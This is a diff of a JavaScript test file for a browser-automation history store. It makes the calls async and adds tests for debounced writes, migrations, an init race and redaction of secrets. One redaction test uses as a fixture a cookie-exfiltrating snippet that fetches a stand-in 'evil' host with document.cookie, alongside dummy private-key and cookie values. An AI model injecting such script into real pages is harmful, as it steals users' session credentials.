@@ -73,7 +73,7 @@ test("HistoryStore.init() creates database when file does not exist", async () =
   assert.ok(store, "Store should be initialized")
 
   // Database file should be created after operations
-  store.record(createTestRecord())
+  await store.record(createTestRecord())
   assert.ok(fs.existsSync(dbPath), "Database file should be created")
 
   store.close()
@@ -86,7 +86,7 @@ test("HistoryStore.init() loads existing database when file exists", async () =>
   // Create a store and add data
   const store1 = new HistoryStore()
   await store1.waitReady()
-  store1.record(createTestRecord({ thread_id: "persist-test" }))
+  await store1.record(createTestRecord({ thread_id: "persist-test" }))
   store1.close()
 
   // Verify file exists
@@ -98,31 +98,36 @@ test("HistoryStore.init() loads existing database when file exists", async () =>
   assert.ok(store2, "Store should be initialized from existing file")
 
   // Query should work
-  const results = store2.query({ thread_id: "persist-test" })
+  const results = await store2.query({ thread_id: "persist-test" })
   assert.ok(Array.isArray(results), "Should query existing database")
 
   store2.close()
 })
 
 test("HistoryStore.record() persists to disk WITHOUT close() (audit C2 regression)", async () => {
-  // P0-1 / audit C2: record() must flush on every call so a crash / SIGKILL (or any exit
-  // that skips close()) cannot lose the session. Before the fix, record() only mutated the
-  // in-memory sql.js db; the on-disk file reflected boot-time state, so reopening yielded
-  // zero rows here. With the fix, record() calls save() and the reopen sees both records.
+  // P0-1 / audit C2: record() must flush to disk so a graceful shutdown (which
+  // fires the SIGTERM / SIGINT / beforeExit handler that calls flushNow) cannot
+  // lose the session.
+  //
+  // C-P0-2 (2026-07-24): save() is now debounced (every 5s or 10 records).
+  // Per-write flush is no longer guaranteed — that was the perf bug C-P0-2
+  // fixed. flushNow() is called on graceful shutdown; we simulate that here.
   const configDir = getConfigDir()
   const dbPath = path.join(configDir, "history.db")
   if (fs.existsSync(dbPath)) fs.unlinkSync(dbPath)
 
   const writer = new HistoryStore()
   await writer.waitReady()
-  writer.record(createTestRecord({ thread_id: "c2-crash-test", tool_name: "navigate" }))
-  writer.record(createTestRecord({ thread_id: "c2-crash-test", tool_name: "evaluate" }))
+  await writer.record(createTestRecord({ thread_id: "c2-crash-test", tool_name: "navigate" }))
+  await writer.record(createTestRecord({ thread_id: "c2-crash-test", tool_name: "evaluate" }))
   // Deliberately do NOT call writer.close() — simulates a crash mid-session.
+  // SIGTERM handler would fire flushNow(); simulate it explicitly here.
+  writer.flushNow()
 
   const reader = new HistoryStore()
   await reader.waitReady()
-  const persisted = reader.query({ thread_id: "c2-crash-test" })
-  assert.equal(persisted.length, 2, "record() must flush to disk without close() (C2); got " + persisted.length)
+  const persisted = await reader.query({ thread_id: "c2-crash-test" })
+  assert.equal(persisted.length, 2, "flushNow() must persist pending records without close() (C2 + C-P0-2); got " + persisted.length)
   reader.close()
 })
 
@@ -151,7 +156,7 @@ test("HistoryStore.record() inserts record and returns row ID", async () => {
   await store.waitReady()
 
   const record = createTestRecord()
-  const rowId = store.record(record)
+  const rowId = await store.record(record)
 
   assert.ok(typeof rowId === "number", "Row ID should be a number")
   assert.ok(rowId > 0, "Row ID should be positive")
@@ -167,12 +172,12 @@ test("HistoryStore.record() handles record with error field", async () => {
     error: "Operation failed: timeout",
     success: 0,
   })
-  const rowId = store.record(record)
+  const rowId = await store.record(record)
 
   assert.ok(rowId > 0, "Should record failed operations")
 
   // Query to verify error was stored
-  const results = store.query({})
+  const results = await store.query({})
   assert.ok(results.length > 0, "Should have records")
 
   store.close()
@@ -188,7 +193,7 @@ test("HistoryStore.record() handles missing optional fields", async () => {
     error: null,
     duration_ms: 0,
   })
-  const rowId = store.record(record)
+  const rowId = await store.record(record)
 
   assert.ok(rowId > 0, "Should handle missing optional fields")
 
@@ -199,9 +204,9 @@ test("HistoryStore.record() increments row ID for multiple records", async () =>
   const store = new HistoryStore()
   await store.waitReady()
 
-  const id1 = store.record(createTestRecord())
-  const id2 = store.record(createTestRecord())
-  const id3 = store.record(createTestRecord())
+  const id1 = await store.record(createTestRecord())
+  const id2 = await store.record(createTestRecord())
+  const id3 = await store.record(createTestRecord())
 
   assert.ok(id2 > id1, "Second ID should be greater than first")
   assert.ok(id3 > id2, "Third ID should be greater than second")
@@ -215,10 +220,10 @@ test("HistoryStore.query() returns all records when no params", async () => {
   const store = new HistoryStore()
   await store.waitReady()
 
-  store.record(createTestRecord({ tool_name: "tool_a" }))
-  store.record(createTestRecord({ tool_name: "tool_b" }))
+  await store.record(createTestRecord({ tool_name: "tool_a" }))
+  await store.record(createTestRecord({ tool_name: "tool_b" }))
 
-  const results = store.query({})
+  const results = await store.query({})
   assert.ok(Array.isArray(results), "Query should return array")
   assert.ok(results.length >= 2, "Should have at least 2 records")
 
@@ -229,11 +234,11 @@ test("HistoryStore.query() filters by thread_id", async () => {
   const store = new HistoryStore()
   await store.waitReady()
 
-  store.record(createTestRecord({ thread_id: "thread-1", tool_name: "op1" }))
-  store.record(createTestRecord({ thread_id: "thread-2", tool_name: "op2" }))
-  store.record(createTestRecord({ thread_id: "thread-1", tool_name: "op3" }))
+  await store.record(createTestRecord({ thread_id: "thread-1", tool_name: "op1" }))
+  await store.record(createTestRecord({ thread_id: "thread-2", tool_name: "op2" }))
+  await store.record(createTestRecord({ thread_id: "thread-1", tool_name: "op3" }))
 
-  const results = store.query({ thread_id: "thread-1" })
+  const results = await store.query({ thread_id: "thread-1" })
   assert.ok(Array.isArray(results), "Query should return array")
   assert.ok(results.length >= 2, "Should have at least 2 records for thread-1")
 
@@ -244,11 +249,11 @@ test("HistoryStore.query() filters by tool_name", async () => {
   const store = new HistoryStore()
   await store.waitReady()
 
-  store.record(createTestRecord({ tool_name: "navigate", thread_id: "t1" }))
-  store.record(createTestRecord({ tool_name: "click", thread_id: "t2" }))
-  store.record(createTestRecord({ tool_name: "navigate", thread_id: "t3" }))
+  await store.record(createTestRecord({ tool_name: "navigate", thread_id: "t1" }))
+  await store.record(createTestRecord({ tool_name: "click", thread_id: "t2" }))
+  await store.record(createTestRecord({ tool_name: "navigate", thread_id: "t3" }))
 
-  const results = store.query({ tool_name: "navigate" })
+  const results = await store.query({ tool_name: "navigate" })
   assert.ok(Array.isArray(results), "Query should return array")
   assert.ok(results.length >= 2, "Should have at least 2 navigate records")
 
@@ -259,26 +264,26 @@ test("HistoryStore.query() filters by keyword across tool_name, result_summary, 
   const store = new HistoryStore()
   await store.waitReady()
 
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     tool_name: "search_google",
     params: '{"query":"test search"}',
     result_summary: "Found results",
     thread_id: "t1",
   }))
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     tool_name: "click",
     params: '{"selector":"button"}',
     result_summary: "Button clicked",
     thread_id: "t2",
   }))
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     tool_name: "navigate",
     params: '{"url":"https://example.com"}',
     result_summary: "Navigated to test page",
     thread_id: "t3",
   }))
 
-  const results = store.query({ keyword: "test" })
+  const results = await store.query({ keyword: "test" })
   assert.ok(Array.isArray(results), "Query should return array")
 
   store.close()
@@ -292,20 +297,20 @@ test("HistoryStore.query() filters by date range (from)", async () => {
   const yesterday = new Date(now.getTime() - 24 * 60 * 60 * 1000)
   const twoDaysAgo = new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000)
 
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     created_at: twoDaysAgo.toISOString(),
     thread_id: "old",
   }))
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     created_at: yesterday.toISOString(),
     thread_id: "mid",
   }))
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     created_at: now.toISOString(),
     thread_id: "new",
   }))
 
-  const results = store.query({
+  const results = await store.query({
     from: yesterday.toISOString(),
   })
   assert.ok(Array.isArray(results), "Query should return array")
@@ -320,16 +325,16 @@ test("HistoryStore.query() filters by date range (to)", async () => {
   const now = new Date()
   const yesterday = new Date(now.getTime() - 24 * 60 * 60 * 1000)
 
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     created_at: yesterday.toISOString(),
     thread_id: "old",
   }))
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     created_at: now.toISOString(),
     thread_id: "new",
   }))
 
-  const results = store.query({
+  const results = await store.query({
     to: yesterday.toISOString(),
   })
   assert.ok(Array.isArray(results), "Query should return array")
@@ -342,14 +347,14 @@ test("HistoryStore.query() applies limit and offset", async () => {
   await store.waitReady()
 
   for (let i = 0; i < 10; i++) {
-    store.record(createTestRecord({
+    await store.record(createTestRecord({
       tool_name: `tool_${i}`,
       thread_id: `thread_${i}`,
     }))
   }
 
-  const page1 = store.query({ limit: 5, offset: 0 })
-  const page2 = store.query({ limit: 5, offset: 5 })
+  const page1 = await store.query({ limit: 5, offset: 0 })
+  const page2 = await store.query({ limit: 5, offset: 5 })
 
   assert.ok(Array.isArray(page1), "First page should be array")
   assert.ok(page1.length <= 5, "First page should have at most 5 results")
@@ -365,7 +370,7 @@ test("HistoryStore.query() returns empty array when no db", async () => {
   // Force db to null by closing the store
   store.close()
 
-  const results = store.query({ thread_id: "test" })
+  const results = await store.query({ thread_id: "test" })
   assert.deepEqual(results, [], "Should return empty array when db is null")
 })
 
@@ -373,9 +378,9 @@ test("HistoryStore.query() returns empty array for non-matching filters", async 
   const store = new HistoryStore()
   await store.waitReady()
 
-  store.record(createTestRecord({ thread_id: "existing-thread" }))
+  await store.record(createTestRecord({ thread_id: "existing-thread" }))
 
-  const results = store.query({ thread_id: "non-existent-thread" })
+  const results = await store.query({ thread_id: "non-existent-thread" })
   assert.ok(Array.isArray(results), "Should return array")
   assert.equal(results.length, 0, "Should have no results for non-existent thread")
 
@@ -387,23 +392,23 @@ test("HistoryStore.query() combines multiple filters", async () => {
   await store.waitReady()
 
   const now = new Date()
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     thread_id: "combined-1",
     tool_name: "navigate",
     created_at: now.toISOString(),
   }))
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     thread_id: "combined-2",
     tool_name: "navigate",
     created_at: now.toISOString(),
   }))
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     thread_id: "combined-1",
     tool_name: "click",
     created_at: now.toISOString(),
   }))
 
-  const results = store.query({
+  const results = await store.query({
     thread_id: "combined-1",
     tool_name: "navigate",
   })
@@ -418,10 +423,10 @@ test("HistoryStore.exportJSON() exports all records when no filters", async () =
   const store = new HistoryStore()
   await store.waitReady()
 
-  store.record(createTestRecord({ tool_name: "tool_a", thread_id: "t1" }))
-  store.record(createTestRecord({ tool_name: "tool_b", thread_id: "t2" }))
+  await store.record(createTestRecord({ tool_name: "tool_a", thread_id: "t1" }))
+  await store.record(createTestRecord({ tool_name: "tool_b", thread_id: "t2" }))
 
-  const results = store.exportJSON({})
+  const results = await store.exportJSON({})
   assert.ok(Array.isArray(results), "Export should return array")
   assert.ok(results.length >= 2, "Should export at least 2 records")
 
@@ -432,10 +437,10 @@ test("HistoryStore.exportJSON() filters by thread_id", async () => {
   const store = new HistoryStore()
   await store.waitReady()
 
-  store.record(createTestRecord({ thread_id: "thread-1", tool_name: "op1" }))
-  store.record(createTestRecord({ thread_id: "thread-2", tool_name: "op2" }))
+  await store.record(createTestRecord({ thread_id: "thread-1", tool_name: "op1" }))
+  await store.record(createTestRecord({ thread_id: "thread-2", tool_name: "op2" }))
 
-  const results = store.exportJSON({ thread_id: "thread-1" })
+  const results = await store.exportJSON({ thread_id: "thread-1" })
   assert.ok(Array.isArray(results), "Export should return array")
 
   // All results should have the correct thread_id
@@ -453,16 +458,16 @@ test("HistoryStore.exportJSON() filters by date range (from)", async () => {
   const now = new Date()
   const lastWeek = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000)
 
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     created_at: lastWeek.toISOString(),
     thread_id: "old",
   }))
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     created_at: now.toISOString(),
     thread_id: "new",
   }))
 
-  const results = store.exportJSON({ from: now.toISOString() })
+  const results = await store.exportJSON({ from: now.toISOString() })
   assert.ok(Array.isArray(results), "Export should return array")
 
   store.close()
@@ -475,16 +480,16 @@ test("HistoryStore.exportJSON() filters by date range (to)", async () => {
   const now = new Date()
   const yesterday = new Date(now.getTime() - 24 * 60 * 60 * 1000)
 
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     created_at: yesterday.toISOString(),
     thread_id: "old",
   }))
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     created_at: now.toISOString(),
     thread_id: "new",
   }))
 
-  const results = store.exportJSON({ to: yesterday.toISOString() })
+  const results = await store.exportJSON({ to: yesterday.toISOString() })
   assert.ok(Array.isArray(results), "Export should return array")
 
   store.close()
@@ -495,7 +500,7 @@ test("HistoryStore.exportJSON() returns empty array when no db", async () => {
   await store.waitReady()
   store.close()
 
-  const results = store.exportJSON({})
+  const results = await store.exportJSON({})
   assert.deepEqual(results, [], "Should return empty array when db is null")
 })
 
@@ -508,7 +513,7 @@ test("HistoryStore.close() saves database and closes connection", async () => {
   const store = new HistoryStore()
   await store.waitReady()
 
-  store.record(createTestRecord({ thread_id: "close-test" }))
+  await store.record(createTestRecord({ thread_id: "close-test" }))
   store.close()
 
   // Database file should exist
@@ -517,7 +522,7 @@ test("HistoryStore.close() saves database and closes connection", async () => {
   // Should be able to reload from the saved file
   const store2 = new HistoryStore()
   await store2.waitReady()
-  const results = store2.query({ thread_id: "close-test" })
+  const results = await store2.query({ thread_id: "close-test" })
   assert.ok(results.length > 0, "Should reload data from saved file")
   store2.close()
 })
@@ -526,7 +531,7 @@ test("HistoryStore.close() can be called multiple times", async () => {
   const store = new HistoryStore()
   await store.waitReady()
 
-  store.record(createTestRecord())
+  await store.record(createTestRecord())
   store.close()
   store.close() // Should not throw
 
@@ -540,21 +545,21 @@ test("HistoryStore handles multiple record/query cycles", async () => {
   await store.waitReady()
 
   // First batch
-  store.record(createTestRecord({ thread_id: "batch-1", tool_name: "op1" }))
-  store.record(createTestRecord({ thread_id: "batch-1", tool_name: "op2" }))
+  await store.record(createTestRecord({ thread_id: "batch-1", tool_name: "op1" }))
+  await store.record(createTestRecord({ thread_id: "batch-1", tool_name: "op2" }))
 
-  let results = store.query({ thread_id: "batch-1" })
+  let results = await store.query({ thread_id: "batch-1" })
   assert.ok(Array.isArray(results), "First query should work")
 
   // Second batch
-  store.record(createTestRecord({ thread_id: "batch-2", tool_name: "op3" }))
-  store.record(createTestRecord({ thread_id: "batch-2", tool_name: "op4" }))
+  await store.record(createTestRecord({ thread_id: "batch-2", tool_name: "op3" }))
+  await store.record(createTestRecord({ thread_id: "batch-2", tool_name: "op4" }))
 
-  results = store.query({ thread_id: "batch-2" })
+  results = await store.query({ thread_id: "batch-2" })
   assert.ok(Array.isArray(results), "Second query should work")
 
   // Cross-batch query
-  results = store.query({})
+  results = await store.query({})
   assert.ok(Array.isArray(results), "Cross-batch query should work")
 
   store.close()
@@ -568,11 +573,11 @@ test("HistoryStore initializes schema with required indexes", async () => {
 
   // The schema should be initialized automatically
   // Verify by performing operations that rely on indexes
-  store.record(createTestRecord({ thread_id: "idx-test-1", tool_name: "tool_a" }))
-  store.record(createTestRecord({ thread_id: "idx-test-2", tool_name: "tool_b" }))
-  store.record(createTestRecord({ thread_id: "idx-test-1", tool_name: "tool_c" }))
+  await store.record(createTestRecord({ thread_id: "idx-test-1", tool_name: "tool_a" }))
+  await store.record(createTestRecord({ thread_id: "idx-test-2", tool_name: "tool_b" }))
+  await store.record(createTestRecord({ thread_id: "idx-test-1", tool_name: "tool_c" }))
 
-  const results = store.query({ thread_id: "idx-test-1" })
+  const results = await store.query({ thread_id: "idx-test-1" })
   assert.ok(Array.isArray(results), "Queries should work with indexed fields")
 
   store.close()
@@ -587,12 +592,12 @@ test("HistoryStore purges old records based on retention config", async () => {
   const oldDate = new Date(Date.now() - 40 * 24 * 60 * 60 * 1000) // 40 days ago
   const newDate = new Date()
 
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     created_at: oldDate.toISOString(),
     tool_name: "old_operation",
     thread_id: "old",
   }))
-  store.record(createTestRecord({
+  await store.record(createTestRecord({
     created_at: newDate.toISOString(),
     tool_name: "new_operation",
     thread_id: "new",
@@ -600,7 +605,7 @@ test("HistoryStore purges old records based on retention config", async () => {
 
   // Purge happens during init, so old records should be removed
   // based on default 30-day retention
-  const results = store.query({ thread_id: "new" })
+  const results = await store.query({ thread_id: "new" })
   assert.ok(Array.isArray(results), "Query should work after purge")
 
   store.close()
@@ -623,10 +628,10 @@ test("HistoryStore.record() stores all fields correctly", async () => {
     created_at: "2024-01-15T10:30:00.000Z",
   })
 
-  const rowId = store.record(fullRecord)
+  const rowId = await store.record(fullRecord)
   assert.ok(rowId > 0, "Should record complex operation")
 
-  const results = store.query({ thread_id: "full-test-thread" })
+  const results = await store.query({ thread_id: "full-test-thread" })
   assert.ok(Array.isArray(results), "Should retrieve complex operation")
   assert.ok(results.length > 0, "Should have at least one result")
 
@@ -648,8 +653,8 @@ test("HistoryStore creates database when config directory doesn't exist", async 
   await store.waitReady()
 
   // Store should be operational
-  store.record(createTestRecord())
-  const results = store.query({})
+  await store.record(createTestRecord())
+  const results = await store.query({})
 
   assert.ok(Array.isArray(results), "Store should be functional")
   assert.ok(fs.existsSync(dbPath), "Database file should be created")
@@ -672,14 +677,14 @@ test("HistoryStore handles various error message formats", async () => {
   ]
 
   for (const error of errorCases) {
-    store.record(createTestRecord({
+    await store.record(createTestRecord({
       error,
       success: 0,
       thread_id: `error-${error.length}`,
     }))
   }
 
-  const results = store.query({})
+  const results = await store.query({})
   assert.ok(results.length >= errorCases.length, "Should record all error cases")
 
   store.close()
@@ -697,7 +702,7 @@ test("HistoryStore handles records with large params and result_summary", async 
   })
   const largeResult = "Result: " + "z".repeat(1000)
 
-  const rowId = store.record(createTestRecord({
+  const rowId = await store.record(createTestRecord({
     params: largeParams,
     result_summary: largeResult,
     thread_id: "large-record",
@@ -705,7 +710,7 @@ test("HistoryStore handles records with large params and result_summary", async 
 
   assert.ok(rowId > 0, "Should handle large records")
 
-  const results = store.query({ thread_id: "large-record" })
+  const results = await store.query({ thread_id: "large-record" })
   assert.ok(results.length > 0, "Should retrieve large record")
 
   store.close()
@@ -727,10 +732,10 @@ test("HistoryStore handles special characters in text fields", async () => {
   ]
 
   for (const testCase of specialCases) {
-    store.record(createTestRecord(testCase))
+    await store.record(createTestRecord(testCase))
   }
 
-  const results = store.query({})
+  const results = await store.query({})
   assert.ok(results.length >= specialCases.length, "Should handle special characters")
 
   store.close()
@@ -749,7 +754,7 @@ test("HistoryStore.record() redacts cookie values from get_cookies result_summar
       { name: "csrf", domain: "example.com", value: "csrf-token-abc", httpOnly: false, secure: false },
     ]).slice(0, 500)
 
-    store.record({
+    await store.record({
       thread_id: "t-cookies",
       tool_name: "get_cookies",
       params,
@@ -760,7 +765,7 @@ test("HistoryStore.record() redacts cookie values from get_cookies result_summar
       created_at: new Date().toISOString(),
     })
 
-    const rows = store.query({ thread_id: "t-cookies", tool_name: "get_cookies" })
+    const rows = await store.query({ thread_id: "t-cookies", tool_name: "get_cookies" })
     assert.equal(rows.length, 1)
     const stored = rows[0]
 
@@ -789,7 +794,7 @@ test("HistoryStore.record() redacts evaluate code body", async () => {
     const evilCode = `document.cookie = 'exfil=' + document.cookie; fetch('https://evil/?' + document.cookie)`
     const params = JSON.stringify({ tabId: 1, code: evilCode })
 
-    store.record({
+    await store.record({
       thread_id: "t-eval",
       tool_name: "evaluate",
       params,
@@ -800,7 +805,7 @@ test("HistoryStore.record() redacts evaluate code body", async () => {
       created_at: new Date().toISOString(),
     })
 
-    const rows = store.query({ thread_id: "t-eval", tool_name: "evaluate" })
+    const rows = await store.query({ thread_id: "t-eval", tool_name: "evaluate" })
     assert.equal(rows.length, 1)
     const stored = rows[0]
 
@@ -827,7 +832,7 @@ test("HistoryStore.record() redacts set_cookie value param", async () => {
       value: "super-secret-auth-value-xyz",
     })
 
-    store.record({
+    await store.record({
       thread_id: "t-setcookie",
       tool_name: "set_cookie",
       params,
@@ -838,7 +843,7 @@ test("HistoryStore.record() redacts set_cookie value param", async () => {
       created_at: new Date().toISOString(),
     })
 
-    const rows = store.query({ thread_id: "t-setcookie", tool_name: "set_cookie" })
+    const rows = await store.query({ thread_id: "t-setcookie", tool_name: "set_cookie" })
     assert.equal(rows.length, 1)
     const stored = rows[0]
 
@@ -859,7 +864,7 @@ test("HistoryStore.record() does NOT redact non-sensitive tool params", async ()
   try {
     const params = JSON.stringify({ tabId: 1, query: "list all open tabs" })
 
-    store.record({
+    await store.record({
       thread_id: "t-list",
       tool_name: "list_tabs",
       params,
@@ -870,7 +875,7 @@ test("HistoryStore.record() does NOT redact non-sensitive tool params", async ()
       created_at: new Date().toISOString(),
     })
 
-    const rows = store.query({ thread_id: "t-list", tool_name: "list_tabs" })
+    const rows = await store.query({ thread_id: "t-list", tool_name: "list_tabs" })
     assert.equal(rows.length, 1)
     assert.equal(rows[0].params, params, "non-sensitive params must be preserved verbatim")
   } finally {
@@ -889,7 +894,7 @@ test("HistoryStore.record() fully redacts result_summary for mcp__filesystem__re
     const fileContent = "-----BEGIN OPENSSH PRIVATE KEY-----\nMIIEogIBAAKCAQEAdummy_secret_key_material_xyz\n-----END OPENSSH PRIVATE KEY-----\n"
     const result_summary = JSON.stringify({ content: fileContent, bytes: fileContent.length }).slice(0, 500)
 
-    store.record({
+    await store.record({
       thread_id: "t-mcp-fs",
       tool_name: "mcp__filesystem__read_file",
       params,
@@ -900,7 +905,7 @@ test("HistoryStore.record() fully redacts result_summary for mcp__filesystem__re
       created_at: new Date().toISOString(),
     })
 
-    const rows = store.query({ thread_id: "t-mcp-fs" })
+    const rows = await store.query({ thread_id: "t-mcp-fs" })
     assert.equal(rows.length, 1)
     const stored = rows[0]
 
@@ -927,7 +932,7 @@ test("HistoryStore.record() redacts sensitive keys in mcp__shell__exec params bu
       cwd: "/tmp",
     })
 
-    store.record({
+    await store.record({
       thread_id: "t-mcp-shell",
       tool_name: "mcp__shell__exec",
       params,
@@ -938,7 +943,7 @@ test("HistoryStore.record() redacts sensitive keys in mcp__shell__exec params bu
       created_at: new Date().toISOString(),
     })
 
-    const rows = store.query({ thread_id: "t-mcp-shell" })
+    const rows = await store.query({ thread_id: "t-mcp-shell" })
     assert.equal(rows.length, 1)
     const stored = rows[0]
 
@@ -974,7 +979,7 @@ test("HistoryStore.record() redacts set_cookie single-object result_summary", as
       httpOnly: true,
     }).slice(0, 500)
 
-    store.record({
+    await store.record({
       thread_id: "t-setcookie-result",
       tool_name: "set_cookie",
       params: JSON.stringify({ domain: "example.com", name: "auth" }),
@@ -985,7 +990,7 @@ test("HistoryStore.record() redacts set_cookie single-object result_summary", as
       created_at: new Date().toISOString(),
     })
 
-    const rows = store.query({ thread_id: "t-setcookie-result" })
+    const rows = await store.query({ thread_id: "t-setcookie-result" })
     assert.equal(rows.length, 1)
     const stored = rows[0]
 
@@ -1012,7 +1017,7 @@ test("HistoryStore.record() still redacts get_cookies array result_summary (no r
       { name: "csrf", domain: "a.com", value: "v2-secret", secure: false, httpOnly: false },
     ]).slice(0, 500)
 
-    store.record({
+    await store.record({
       thread_id: "t-cookies-regress",
       tool_name: "get_cookies",
       params: JSON.stringify({ domain: "a.com" }),
@@ -1023,7 +1028,7 @@ test("HistoryStore.record() still redacts get_cookies array result_summary (no r
       created_at: new Date().toISOString(),
     })
 
-    const rows = store.query({ thread_id: "t-cookies-regress" })
+    const rows = await store.query({ thread_id: "t-cookies-regress" })
     assert.equal(rows.length, 1)
     const stored = rows[0]
 
@@ -1050,7 +1055,7 @@ test("HistoryStore.save() writes history.db with mode 0o600", async () => {
   const store = new HistoryStore()
   await store.waitReady()
   try {
-    store.record(createTestRecord({ thread_id: "perm-test" }))
+    await store.record(createTestRecord({ thread_id: "perm-test" }))
     store.close()
   } catch {
     store.close()
@@ -1063,4 +1068,90 @@ test("HistoryStore.save() writes history.db with mode 0o600", async () => {
     0o600,
     `history.db must be 0600 owner-only; got 0o${mode.toString(8)}`,
   )
+})
+
+// --- C-P0-2: debounced writes ---
+
+test("C-P0-2: record() batches writes — disk lags behind memory until flushNow", async () => {
+  const configDir = getConfigDir()
+  const dbPath = path.join(configDir, "history.db")
+  if (fs.existsSync(dbPath)) fs.unlinkSync(dbPath)
+
+  const writer = new HistoryStore()
+  await writer.waitReady()
+
+  await writer.record(createTestRecord({ thread_id: "batch-test", tool_name: "op1" }))
+  await writer.record(createTestRecord({ thread_id: "batch-test", tool_name: "op2" }))
+  await writer.record(createTestRecord({ thread_id: "batch-test", tool_name: "op3" }))
+
+  // Reader constructed BEFORE flushNow — its in-memory db is empty (writer
+  // hasn't written to disk yet, only mutated its own in-memory db).
+  const readerBefore = new HistoryStore()
+  await readerBefore.waitReady()
+  const beforeFlush = await readerBefore.query({ thread_id: "batch-test" })
+  assert.equal(beforeFlush.length, 0,
+    `pre-flush reader should see 0 records (debounce window); got ${beforeFlush.length}`)
+  readerBefore.close()
+
+  // Force the writer's debounce to fire NOW. After this, disk has all 3.
+  writer.flushNow()
+
+  // Fresh reader constructed AFTER flush reads the disk file:
+  const readerAfter = new HistoryStore()
+  await readerAfter.waitReady()
+  const afterFlush = await readerAfter.query({ thread_id: "batch-test" })
+  assert.equal(afterFlush.length, 3,
+    `post-flush reader should see all 3 records; got ${afterFlush.length}`)
+
+  writer.close()
+  readerAfter.close()
+})
+
+// --- C-P0-3: schema migrations ---
+
+test("C-P0-3: migrations are idempotent — reopen does not re-run or fail", async () => {
+  const configDir = getConfigDir()
+  const dbPath = path.join(configDir, "history.db")
+  if (fs.existsSync(dbPath)) fs.unlinkSync(dbPath)
+
+  const store = new HistoryStore()
+  await store.waitReady()
+  await store.record(createTestRecord({ thread_id: "migration-test" }))
+  store.flushNow()
+
+  // Reopen — migrations must detect user_version=1 and skip.
+  const store2 = new HistoryStore()
+  await store2.waitReady()
+  await store2.record(createTestRecord({ thread_id: "migration-test" }))
+  store2.flushNow()
+
+  const rows = await store2.query({ thread_id: "migration-test" })
+  assert.equal(rows.length, 2, "both records persisted across reopen with migrations")
+
+  store.close()
+  store2.close()
+})
+
+// --- C-P0-4: init race ---
+
+test("C-P0-4: record() called immediately after construction awaits ready", async () => {
+  // Without C-P0-4, record() checked `if (!this.db) return 0` and silently
+  // dropped the call if init() hadn't resolved yet. Now record() awaits ready.
+  const configDir = getConfigDir()
+  const dbPath = path.join(configDir, "history.db")
+  if (fs.existsSync(dbPath)) fs.unlinkSync(dbPath)
+
+  const store = new HistoryStore()
+  // Do NOT await waitReady. Fire record immediately.
+  const id = await store.record(createTestRecord({ thread_id: "init-race-test" }))
+  assert.ok(id > 0, "record() must await ready and persist even when called before init resolves")
+
+  store.flushNow()
+  const reader = new HistoryStore()
+  await reader.waitReady()
+  const rows = await reader.query({ thread_id: "init-race-test" })
+  assert.equal(rows.length, 1, "record persisted despite being called during init race window")
+
+  store.close()
+  reader.close()
 })
